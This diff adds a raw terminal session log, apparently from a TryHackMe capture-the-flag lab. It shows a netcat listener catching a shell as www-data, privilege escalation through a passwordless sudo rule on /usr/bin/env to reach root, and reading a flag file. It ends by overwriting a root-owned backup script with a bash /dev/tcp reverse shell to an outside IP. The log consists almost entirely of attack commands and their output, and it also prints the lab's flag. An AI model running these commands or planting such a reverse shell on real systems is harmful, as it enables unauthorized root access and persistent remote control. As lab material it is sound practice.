@@ -1,0 +1,73 @@
+Script started on 2025-04-06 22:32:43+03:00 [COMMAND="rlwrap nc -lnvp 4444" TERM="xterm-256color" TTY="/dev/pts/5" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 4444 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 5756
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+[Kbash: no job control in this shell
+www-data@906cbb5f99a9:/var/www$ [Kwww-data@906cbb5f99a9:/var/www$ [K[?2004hwww-data@906cbb5f99a9:/var/www$ cd ..[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ..
+[Kcd ..[Kcd ..[Kcd ..
+www-data@906cbb5f99a9:/var$ [Kwww-data@906cbb5f99a9:/var$ [K[?2004hwww-data@906cbb5f99a9:/var$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+backups
+cache
+lib
+local
+lock
+log
+mail
+opt
+run
+spool
+tmp
+www
+www-data@906cbb5f99a9:/var$ [Kwww-data@906cbb5f99a9:/var$ [K[?2004hwww-data@906cbb5f99a9:/var$ sudo -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -l
+[Ksudo -l[Ksudo -l[Ksudo -l
+Matching Defaults entries for www-data on 906cbb5f99a9:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on 906cbb5f99a9:
+    (root) NOPASSWD: /usr/bin/env
+www-data@906cbb5f99a9:/var$ [Kwww-data@906cbb5f99a9:/var$ [K[?2004hwww-data@906cbb5f99a9:/var$ [7msudo /usr/bin/env /bin/bash[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo /usr/bin/env /bin/bash
+[Ksudo /usr/bin/env /bin/bash[Ksudo /usr/bin/env /bin/bash[Ksudo /usr/bin/env /bin/bash
+[K[K[?2004hid[?2004l[K[?2004hid
+[Kuid=0(root) gid=0(root) groups=0(root)
+[K[K[?2004hwhich python3[?2004l[K[?2004hwhich python3
+[K[K[?2004hcd /root[?2004l[K[?2004hcd /root
+[K[K[?2004hls[?2004l[K[?2004hls
+[Kflag3.txt
+[K[K[?2004hcat flag3.txt[?2004l[K[?2004hcat flag3.txt
+[KTHM{D1ff3r3nt_3nv1ronments_874112}
+[K[K[?2004hls -al[?2004l[K[?2004hls -al
+[Ktotal 20
+drwx------ 1 root root 4096 Mar 10  2020 .
+drwxr-xr-x 1 root root 4096 Apr  6 17:42 ..
+-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
+-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+-r-------- 1 root root   35 Mar 10  2020 flag3.txt
+[K[K[?2004hcd /home[?2004l[K[?2004hcd /home
+[K[K[?2004hls -al[?2004l[K[?2004hls -al
+[Ktotal 8
+drwxr-xr-x 2 root root 4096 Feb  1  2020 .
+drwxr-xr-x 1 root root 4096 Apr  6 17:42 ..
+[K[K[?2004hcd /home[?2004l[K[?2004hcd /home
+[K[K[?2004hls[?2004l[K[?2004hls
+[K[K[?2004hcd /root[?2004l[K[?2004hcd /root
+[K[K[?2004hcd [7m/opt/backups[27m[7mcd [27m/opt/backups[?2004l[K[?2004hcd /opt/backups
+[K[K[?2004hls[?2004l[K[?2004hls
+[Kbackup.sh
+backup.tar
+[K[K[?2004h[7mecho "#!/bin/bash" > backup.sh[27m[?2004l[K[?2004hecho "#!/bin/bash" > backup.sh
+[K[K[?2004h[7mecho "/bin/bash -c 'bash -i >& /dev/tcp/10.8.61.245/6047 0>&1'" >> backup.sh[27m[?2004l[K[?2004hecho "/bin/bash -c 'bash -i >& /dev/tcp/10.8.61.245/6047 0>&1'" >> backup.sh
+[K[K[?2004hcat backup.sh[?2004l[K[?2004hcat backup.sh
+[K#!/bin/bash
+/bin/bash -c 'bash -i >& /dev/tcp/10.8.61.245/6047 0>&1'
+[K[K[?2004hls -l[?2004l[K[?2004hls -l
+[Ktotal 2884
+-rwxr--r-- 1 root root      69 Apr  6 19:35 backup.sh
+-rw-r--r-- 1 root root 2949120 Apr  6 19:34 backup.tar
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[Kwww-data@906cbb5f99a9:/var$ [Kwww-data@906cbb5f99a9:/var$ [K[?2004hwww-data@906cbb5f99a9:/var$ exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[?2004l
+Script done on 2025-04-06 22:37:49+03:00 [COMMAND_EXIT_CODE="0"]
